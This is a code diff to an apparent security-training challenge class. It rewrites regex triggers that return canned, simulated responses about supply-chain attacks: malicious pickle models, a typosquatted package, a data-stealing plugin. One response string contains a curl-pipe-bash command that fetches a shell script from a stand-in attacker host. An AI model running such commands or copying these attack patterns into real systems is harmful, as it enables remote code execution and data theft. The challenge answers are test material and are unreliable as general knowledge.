@@ -58,15 +58,15 @@ class SupplyChainChallenge(BaseChallenge):
                  "response": f"Loading the model: pickle.loads(data) was executed.\n"
                              f"The __reduce__ method fired -> os.system('whoami') was executed.\n"
                              f"Exploit succeeded: {self.secrets['exploit_key']}"},
-                {"pattern": r"typosquat|pip\s+install|paket\s+kur",
+                {"pattern": r"typosquat|pip\s+install|install\s+(?:the\s+)?package",
                  "response": f"pip install llm-security-toolklt (typosquatting package) installed.\n"
                              f"reverse_shell.py was found inside the package -> subprocess.Popen was executed.\n"
                              f"EXPLOIT_SUCCESS: {self.secrets['exploit_key']}"},
-                {"pattern": r"plugin|extension|eklenti",
+                {"pattern": r"plugin|extension|add-?on",
                  "response": f"Plugin loaded: malicious-helper v1.0\n"
                              f"The plugin is sending user data to attacker-server.com.\n"
                              f"Exploit: {self.secrets['exploit_key']}"},
-                {"pattern": r"hugging\s*face|model\s+indir|download",
+                {"pattern": r"hugging\s*face|download",
                  "response": "Downloading model from HuggingFace: evil-corp/gpt2-enhanced\n"
                              "Model file: model.pkl (WARNING: pickle format!)\n"
                              "During load, __reduce__ -> os.system('curl attacker.com/shell.sh | bash')\n"
@@ -74,7 +74,7 @@ class SupplyChainChallenge(BaseChallenge):
             ]
         elif self.difficulty == Difficulty.MEDIUM:
             return [
-                {"pattern": r"safetensor.*convert|donustur.*safe",
+                {"pattern": r"safetensor.*convert|convert.*safetensor",
                  "response": f"Conversion started: model.pkl -> model.safetensors\n"
                              f"WARNING: pickle.loads ran during the conversion!\n"
                              f"__reduce__ triggered: {self.secrets['exploit_key']}"},
@@ -82,7 +82,7 @@ class SupplyChainChallenge(BaseChallenge):
                  "response": "Loading the model... custom_op detected.\n"
                              "os.system call found inside the custom operator.\n"
                              "EXPLOIT_SUCCESS"},
-                {"pattern": r"(?:approved-|guvenli-).*install",
+                {"pattern": r"(?:approved-|verified-).*install",
                  "response": "The approved package installed successfully. The security check passed."},
             ]
         else:  # HARD
